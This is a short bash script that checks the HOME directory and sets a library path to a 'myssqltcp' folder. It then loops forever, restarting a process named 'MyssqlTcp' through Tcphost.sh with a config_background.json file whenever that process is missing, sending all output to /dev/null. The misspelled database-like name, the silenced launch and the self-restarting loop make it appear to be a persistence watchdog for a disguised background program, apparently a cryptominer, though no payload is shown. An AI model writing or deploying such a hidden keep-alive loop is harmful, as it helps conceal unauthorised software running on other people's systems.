#!/bin/bash
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

export LD_LIBRARY_PATH=$HOME/myssqltcp/

while true; do
        server=`ps aux | grep MyssqlTcp | grep -v grep`
        if [ ! "$server" ]; then
            ./addconf.sh
            /bin/bash ./Tcphost.sh --config=./config_background.json >/dev/null 2>&1
            sleep 10
        fi
        ./logserver.sh
        sleep 5
done
